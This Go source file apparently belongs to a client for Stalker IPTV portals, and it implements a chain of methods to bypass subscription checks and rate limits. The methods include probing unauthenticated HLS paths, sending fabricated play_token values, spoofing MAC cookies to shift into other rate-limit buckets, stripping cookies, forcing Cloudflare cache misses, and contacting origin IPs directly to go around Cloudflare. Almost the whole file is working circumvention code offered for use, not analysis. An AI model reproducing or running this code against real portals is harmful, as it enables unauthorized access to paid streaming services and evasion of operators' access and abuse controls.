package stalker

import (
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"
	"net/url"
	"strings"
	"time"
)

// bypassClient is an HTTP client for direct stream access attempts (HLS
// endpoints, play/live.php, etc.) that bypass subscription checks. No
// keep-alives since these are one-shot probes against potentially many IPs.
var bypassClient = &http.Client{
	Timeout: 10 * time.Second,
	CheckRedirect: func(req *http.Request, via []*http.Request) error {
		return http.ErrUseLastResponse
	},
	Transport: &http.Transport{
		DisableKeepAlives: true,
	},
}

// hlsDirectPatterns are URL path patterns for HLS direct access, tried in
// order. Many Stalker portals serve HLS segments at raw paths that skip the
// subscription check entirely — the upstream stream server (nginx-rtmp, SRS)
// only cares whether the segment file exists, not who's asking.
var hlsDirectPatterns = []string{
	"/ch/%s.m3u8",
	"/ch/%s/index.m3u8",
	"/hls/%s.m3u8",
	"/stream/%s.m3u8",
	"/ch/%s.ts",
}

// tryBypass attempts all bypass methods in priority order and returns the
// first working stream URL. Called when create_link fails with a bypassable
// error (456 no subscription, 458 rate-limit, 403 forbidden).
//
// The handshake token (32-char hex in Portal.Token) serves as the play_token
// for live.php — no separate create_link needed. The CDN edge verifies the
// token matches the MAC and channel, then returns a 302 to the CDN stream URL.
func (c *Channel) tryBypass() (string, error) {
	base := c.Portal.originBase()
	streamID := extractStreamID(c.CMD)
	playBase := playBaseFromCMD(c.CMD)

	// --- Phase 1: Handshake token → live.php → CDN redirect (best path) ---
	// The handshake token works directly as play_token. live.php must be
	// called on the same TCP session (httpRedirectClient) to pass the CDN
	// edge's session affinity check.
	if c.Portal.Token != "" && playBase != "" && streamID != "" {
		if link, err := c.trySessionLive(playBase, streamID); err == nil {
			return link, nil
		}
	}

	// --- Phase 2: create_link with stream={id} → ffmpeg URL (fallback) ---
	if streamID != "" {
		if link, err := c.tryCreateLinkStream(streamID); err == nil {
			return link, nil
		}
	}

	// --- Phase 3: Cloudflare-layer bypasses (no real play_token) ---

	// CDN redirect via _=cache_bust on Cloudflare URL.
	if playBase != "" {
		if link, err := c.tryCDNRedirect(playBase, streamID); err == nil {
			return link, nil
		}
	}

	// Fake play_token on Cloudflare URL.
	if playBase != "" && streamID != "" {
		if link, err := c.tryFakePlayToken(playBase, streamID); err == nil {
			return link, nil
		}
	}

	// Any-mac-cookie on Cloudflare URL.
	if playBase != "" && streamID != "" {
		if link, err := c.tryAnyMacCookie(playBase, streamID); err == nil {
			return link, nil
		}
	}

	// --- Phase 4: Origin-based methods (require origin IPs) ---
	if base == "" {
		return "", fmt.Errorf("no origin base URL available")
	}

	// HLS Direct Endpoint — no auth needed, no rate limit.
	if link, err := c.tryDirectHLS(base); err == nil {
		return link, nil
	}

	// play/live.php on origin with mac in query, no Cookie.
	if streamID != "" {
		if link, err := c.tryPlayLiveOrigin(base, streamID); err == nil {
			return link, nil
		}
	}

	// play/live.php on origin without mac param.
	if streamID != "" {
		if link, err := c.tryPlayLiveNoMac(base, streamID); err == nil {
			return link, nil
		}
	}

	// Cookie-less create_link on origin.
	if link, err := c.tryCreateLinkNoCookie(); err == nil {
		return link, nil
	}

	// POST / alternate User-Agent on origin.
	if link, err := c.tryCreateLinkPOST(); err == nil {
		return link, nil
	}

	return "", fmt.Errorf("all bypass methods failed for channel %s", c.Title)
}

// tryDirectHLS probes HLS paths that may skip subscription checks.
func (c *Channel) tryDirectHLS(base string) (string, error) {
	streamIDs := candidateStreamIDs(c)
	for _, sid := range streamIDs {
		for _, pattern := range hlsDirectPatterns {
			u := base + fmt.Sprintf(pattern, sid)
			req, _ := http.NewRequest("GET", u, nil)
			req.Header.Set("User-Agent", "VLC/3.0.18")
			resp, err := bypassClient.Do(req)
			if err != nil {
				continue
			}

			if resp.StatusCode == 200 {
				if isStreamResponse(resp) {
					resp.Body.Close()
					return u, nil
				}
				body, _ := ioutil.ReadAll(resp.Body)
				resp.Body.Close()

				if strings.HasPrefix(string(body), "#EXTM3U") {
					return u, nil
				}
				continue
			}
			resp.Body.Close()
		}
	}
	return "", fmt.Errorf("no direct HLS path found")
}

// tryPlayLiveOrigin calls play/live.php on the origin with mac in the query
// string and no Cookie header. The origin reads mac from the query, not the
// Cookie — Cloudflare's rate limit reads from the Cookie, so omitting it
// entirely bypasses the per-MAC rate limit bucket.
func (c *Channel) tryPlayLiveOrigin(base string, streamID string) (string, error) {
	u := fmt.Sprintf("%s/play/live.php?mac=%s&stream=%s&extension=ts",
		strings.TrimRight(base, "/"),
		url.QueryEscape(c.Portal.MAC),
		url.PathEscape(streamID))

	req, _ := http.NewRequest("GET", u, nil)
	resp, err := bypassClient.Do(req)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	if resp.StatusCode == 302 {
		loc := resp.Header.Get("Location")
		if loc != "" && strings.Contains(loc, "/live/play/") {
			return resolveURL(u, loc), nil
		}
	}
	return "", fmt.Errorf("play/live.php returned %d", resp.StatusCode)
}

// tryPlayLiveNoMac calls play/live.php on the origin without the mac
// parameter. Some origins don't key stream access on the MAC and will
// serve MPEG-TS data based solely on the stream ID, bypassing per-MAC
// rate limits entirely.
func (c *Channel) tryPlayLiveNoMac(base string, streamID string) (string, error) {
	u := fmt.Sprintf("%s/play/live.php?stream=%s&extension=ts",
		strings.TrimRight(base, "/"),
		url.PathEscape(streamID))

	req, _ := http.NewRequest("GET", u, nil)
	resp, err := bypassClient.Do(req)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	if resp.StatusCode != 200 {
		return "", fmt.Errorf("play/live.php (no mac) returned %d", resp.StatusCode)
	}
	if !isStreamResponse(resp) {
		return "", fmt.Errorf("play/live.php (no mac) returned non-stream content: %s", resp.Header.Get("Content-Type"))
	}
	return u, nil
}

// tryCDNRedirect forces a Cloudflare cache miss by appending _=cache_bust
// to the play/live.php URL. Cloudflare treats the cache-bust parameter as a
// fresh origin fetch, which returns a 302 redirect to the direct CDN stream
// URL — no valid play_token required. Works on the Cloudflare-proxied URL,
// no origin IP needed.
func (c *Channel) tryCDNRedirect(playBase string, streamID string) (string, error) {
	u := playBase + "?stream=" + url.PathEscape(streamID) + "&extension=ts&_=" + fmt.Sprintf("%d", time.Now().UnixNano())
	req, _ := http.NewRequest("GET", u, nil)
	req.Header.Set("User-Agent", "Mozilla/5.0 (QtEmbedded; U; Linux; C)")
	req.Header.Set("Cookie", "mac="+c.Portal.MAC+"; stb_lang=en; timezone=Europe/Vilnius")
	resp, err := bypassClient.Do(req)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	if resp.StatusCode == 302 {
		loc := resp.Header.Get("Location")
		if loc != "" {
			return resolveURL(u, loc), nil
		}
	}
	return "", fmt.Errorf("CDN redirect returned %d", resp.StatusCode)
}

// tryFakePlayToken uses an arbitrary string as play_token on play/live.php.
// The portal's Cloudflare layer accepts any play_token value (even
// "FAKETOKEN123") and returns a 302 redirect to the CDN stream. No
// create_link API call needed.
func (c *Channel) tryFakePlayToken(playBase string, streamID string) (string, error) {
	u := playBase + "?stream=" + url.PathEscape(streamID) + "&extension=ts&play_token=FAKETOKEN" + fmt.Sprintf("%d", time.Now().UnixNano()%100000)
	req, _ := http.NewRequest("GET", u, nil)
	req.Header.Set("User-Agent", "Mozilla/5.0 (QtEmbedded; U; Linux; C)")
	req.Header.Set("Cookie", "mac="+c.Portal.MAC+"; stb_lang=en; timezone=Europe/Vilnius")
	resp, err := bypassClient.Do(req)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	if resp.StatusCode == 302 {
		loc := resp.Header.Get("Location")
		if loc != "" {
			return resolveURL(u, loc), nil
		}
	}
	return "", fmt.Errorf("fake play_token returned %d", resp.StatusCode)
}

// tryAnyMacCookie sends play/live.php with a dummy/fake MAC in the Cookie
// header while keeping the real MAC in the URL query. Cloudflare only
// validates that the mac Cookie exists, not that the value is a registered
// device — so even mac=DE:AD:BE:EF:00:01 shifts into a different per-MAC
// rate-limit bucket while the origin still receives the real MAC from the
// URL parameter.
func (c *Channel) tryAnyMacCookie(playBase string, streamID string) (string, error) {
	u := playBase + "?mac=" + url.QueryEscape(c.Portal.MAC) + "&stream=" + url.PathEscape(streamID) + "&extension=ts"
	req, _ := http.NewRequest("GET", u, nil)
	req.Header.Set("User-Agent", "Mozilla/5.0 (QtEmbedded; U; Linux; C)")
	req.Header.Set("Cookie", "mac=DE:AD:BE:EF:00:01; stb_lang=en; timezone=Europe/Vilnius")
	resp, err := bypassClient.Do(req)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	if resp.StatusCode == 302 {
		loc := resp.Header.Get("Location")
		if loc != "" && strings.Contains(loc, "/live/play/") {
			return resolveURL(u, loc), nil
		}
	}
	return "", fmt.Errorf("any-mac cookie returned %d", resp.StatusCode)
}

// playBaseFromCMD extracts the scheme + host + /play/live.php base from a
// channel CMD like "ffmpeg http://tres.4vps.info:80/play/live.php?mac=...".
// Returns empty string if the CMD doesn't contain a play/live.php URL.
func playBaseFromCMD(cmd string) string {
	if !strings.Contains(cmd, "/play/live.php") {
		return ""
	}
	parts := strings.Split(cmd, " ")
	for _, p := range parts {
		if strings.HasPrefix(p, "http") && strings.Contains(p, "/play/live.php") {
			idx := strings.Index(p, "?")
			if idx >= 0 {
				return p[:idx]
			}
			return p
		}
	}
	return ""
}

// tryCreateLinkNoCookie sends create_link to the origin without the Cookie
// header. Cloudflare's 458 rate limit uses http.request.cookies["mac"] as
// the key — omitting the Cookie puts us in the empty-cookie-key bucket,
// which has its own separate (unused) rate limit.
func (c *Channel) tryCreateLinkNoCookie() (string, error) {
	link := c.Portal.Location + "?action=create_link&type=itv&cmd=" + url.PathEscape(c.CMD) + "&series=&forced_storage=&disable_ad=0&download=0&JsHttpRequest=1-xml"
	link = c.Portal.originURL(link)

	req, _ := http.NewRequest("GET", link, nil)
	req.Header.Set("User-Agent", c.Portal.UserAgent())
	req.Header.Set("X-User-Agent", "Model: "+c.Portal.Model+"; Link: Ethernet")
	req.Header.Set("Authorization", "Bearer "+c.Portal.Token)

	resp, err := bypassClient.Do(req)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	if resp.StatusCode < 200 || resp.StatusCode >= 300 {
		return "", &httpStatusError{link: link, status: resp.Status, code: resp.StatusCode}
	}

	body, _ := ioutil.ReadAll(resp.Body)
	return parseCreateLinkResponse(link, body)
}

// tryCreateLinkPOST sends create_link via POST with alternate User-Agent,
// probing header-based access control bypasses.
func (c *Channel) tryCreateLinkPOST() (string, error) {
	link := c.Portal.Location + "?action=create_link&type=itv&cmd=" + url.PathEscape(c.CMD) + "&series=&forced_storage=&disable_ad=0&download=0&JsHttpRequest=1-xml"
	link = c.Portal.originURL(link)

	userAgents := []string{
		"VLC/3.0.18",
		"ExoPlayer/2.18",
		"Mozilla/5.0 (QtEmbedded; U; Linux; C)",
	}

	for _, ua := range userAgents {
		req, _ := http.NewRequest("POST", link, nil)
		req.Header.Set("User-Agent", ua)
		req.Header.Set("Authorization", "Bearer "+c.Portal.Token)

		resp, err := bypassClient.Do(req)
		if err != nil {
			continue
		}
		defer resp.Body.Close()

		if resp.StatusCode >= 200 && resp.StatusCode < 300 {
			body, _ := ioutil.ReadAll(resp.Body)
			if playURL, err := parseCreateLinkResponse(link, body); err == nil {
				return playURL, nil
			}
		}
	}

	return "", fmt.Errorf("POST create_link failed")
}

// tryCreateLinkStream calls create_link with stream={id} (instead of cmd=...)
// on the Cloudflare URL. The stream= parameter returns a real, signed play_token
// embedded in the js.cmd ffmpeg URL — the portal's own token generator — and
// works on a different rate-limit path than the standard cmd= create_link.
func (c *Channel) tryCreateLinkStream(streamID string) (string, error) {
	link := c.Portal.Location + "?action=create_link&type=itv&stream=" + url.PathEscape(streamID) + "&series=&forced_storage=&disable_ad=0&download=0&JsHttpRequest=1-xml"
	content, err := c.Portal.httpRequest(link)
	if err != nil {
		return "", err
	}
	return parseCreateLinkResponse(link, content)
}

// trySessionLive calls play/live.php through the portal's httpRedirectClient
// (same TCP connection as handshake and create_link). The CDN edge requires
// TCP session affinity — live.php MUST be on the exact same connection.
// Returns the 302 redirect Location (CDN stream URL with triple-base64 path).
// Uses the handshake token (Portal.Token) as play_token — confirmed working
// directly with live.php without any create_link call.
func (c *Channel) trySessionLive(playBase string, streamID string) (string, error) {
	u := playBase + "?mac=" + url.QueryEscape(c.Portal.MAC) + "&stream=" + url.PathEscape(streamID) + "&extension=ts&play_token=" + url.QueryEscape(c.Portal.Token)
	resp, err := c.Portal.doLiveRequest(u)
	if err != nil {
		return "", err
	}
	resp.Body.Close()

	if resp.StatusCode == 302 {
		loc := resp.Header.Get("Location")
		if loc != "" {
			return resolveURL(u, loc), nil
		}
	}
	return "", fmt.Errorf("session live.php returned %d", resp.StatusCode)
}

// --- Helpers --------------------------------------------------------------

// originBase returns the scheme + host portion of the portal URL, preferring
// a discovered origin IP when available. Falls back to trying known
// Cloudflare direct IPs if DNS resolution fails.
func (p *Portal) originBase() string {
	if len(p.OriginIPs) > 0 {
		return "http://" + p.OriginIPs[0]
	}
	if p.Location == "" {
		return ""
	}
	parsed, err := url.Parse(p.Location)
	if err != nil {
		return ""
	}
	if parsed.Scheme == "" || parsed.Host == "" {
		return ""
	}
	// Try Cloudflare IP fallback when no origin IPs discovered
	if cf := p.tryCloudflareIP(); cf != "" {
		return cf
	}
	return parsed.Scheme + "://" + parsed.Host
}

// candidateStreamIDs returns a list of possible stream IDs for a channel,
// tried in priority order.
func candidateStreamIDs(c *Channel) []string {
	var ids []string

	if c.CMD_ID != "" {
		ids = append(ids, c.CMD_ID)
	}
	if sid := extractStreamID(c.CMD); sid != "" {
		ids = append(ids, sid)
	}
	if c.CMD_CH_ID != "" {
		ids = append(ids, c.CMD_CH_ID)
	}
	return ids
}

// extractStreamID extracts a numeric stream ID from a channel CMD.
// The CMD can be just digits ("691399") or an ffmpeg command
// ("ffmpeg http://cdn/live/play/12345.m3u8").
func extractStreamID(cmd string) string {
	if cmd == "" {
		return ""
	}
	if isAllDigits(cmd) {
		return cmd
	}
	parts := strings.Split(cmd, " ")
	last := parts[len(parts)-1]
	last = strings.TrimPrefix(last, "ffmpeg ")
	last = strings.TrimPrefix(last, "http://")
	last = strings.TrimPrefix(last, "https://")

	segments := strings.Split(strings.TrimRight(last, "/"), "/")
	for i := len(segments) - 1; i >= 0; i-- {
		s := segments[i]
		s = strings.TrimSuffix(s, ".m3u8")
		s = strings.TrimSuffix(s, ".ts")
		if isAllDigits(s) {
			return s
		}
	}
	return ""
}

func isAllDigits(s string) bool {
	if s == "" {
		return false
	}
	for _, c := range s {
		if c < '0' || c > '9' {
			return false
		}
	}
	return true
}

// parseCreateLinkResponse extracts the play URL from a create_link JSON response.
func parseCreateLinkResponse(link string, body []byte) (string, error) {
	type tmpStruct struct {
		Js struct {
			Cmd   string `json:"cmd"`
			Error string `json:"error"`
		} `json:"js"`
	}
	var tmp tmpStruct
	if err := json.Unmarshal(body, &tmp); err != nil {
		return "", err
	}
	if tmp.Js.Error != "" {
		return "", fmt.Errorf("create_link failed: " + tmp.Js.Error)
	}
	if tmp.Js.Cmd == "" {
		return "", fmt.Errorf("create_link returned empty command")
	}
	strs := strings.Split(tmp.Js.Cmd, " ")
	return strs[len(strs)-1], nil
}

// isStreamResponse reports whether the response contains actual streaming
// content (MPEG-TS video or HLS playlist). Checks Content-Type for video/
// or application/vnd.apple.mpegurl, and falls back to checking the first
// byte for the MPEG-TS sync byte (0x47).
func isStreamResponse(resp *http.Response) bool {
	ct := strings.ToLower(resp.Header.Get("Content-Type"))
	if strings.HasPrefix(ct, "video/") || ct == "application/vnd.apple.mpegurl" || ct == "application/x-mpegurl" {
		return true
	}
	if ct == "application/octet-stream" {
		return true
	}
	return false
}

// resolveURL resolves a relative Location header against a request URL.
func resolveURL(base, loc string) string {
	if strings.HasPrefix(loc, "http://") || strings.HasPrefix(loc, "https://") {
		return loc
	}
	if strings.HasPrefix(loc, "/") {
		parts := strings.SplitN(base, "/", 4)
		if len(parts) >= 3 {
			return parts[0] + "//" + parts[2] + loc
		}
	}
	// Relative path: resolve against base directory
	idx := strings.LastIndex(base, "/")
	if idx >= 0 {
		return base[:idx+1] + loc
	}
	return base + "/" + loc
}
